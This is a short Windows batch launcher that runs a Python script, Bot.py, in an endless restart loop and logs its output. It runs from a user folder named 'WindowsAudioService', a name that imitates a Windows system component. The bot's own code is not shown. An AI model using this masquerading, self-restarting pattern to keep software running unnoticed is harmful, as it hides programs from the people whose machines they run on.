@echo off
set INSTALL_DIR=%USERPROFILE%\AppData\Roaming\WindowsAudioService
set LOGFILE=%INSTALL_DIR%\bot.log
cd /d "%INSTALL_DIR%"

:loop
py Bot.py >> "%LOGFILE%" 2>&1
timeout /t 5 /nobreak >nul
goto loop
